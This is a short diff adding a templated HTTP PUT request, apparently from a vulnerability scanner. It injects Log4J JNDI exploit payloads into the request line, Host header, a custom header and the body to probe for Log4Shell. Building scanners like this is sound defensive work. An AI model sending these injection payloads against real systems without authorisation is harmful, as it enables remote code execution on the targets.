@@ -1,0 +1,6 @@
+PUT {{ .Fuzzer.PayloadJNDILog4J .Url.String "HTTP-GET" }} HTTP/1.1
+Host: {{ .Fuzzer.PayloadJNDILog4J .Url.String "HTTP-HOST" }}
+No-HEADER: {{ .Fuzzer.PayloadJNDILog4J .Url.String "HTTP-NO-HEADER" }}
+
+{{ .Fuzzer.PayloadJNDILog4J .Url.String "HTTP-PUT-BODY" }}
+
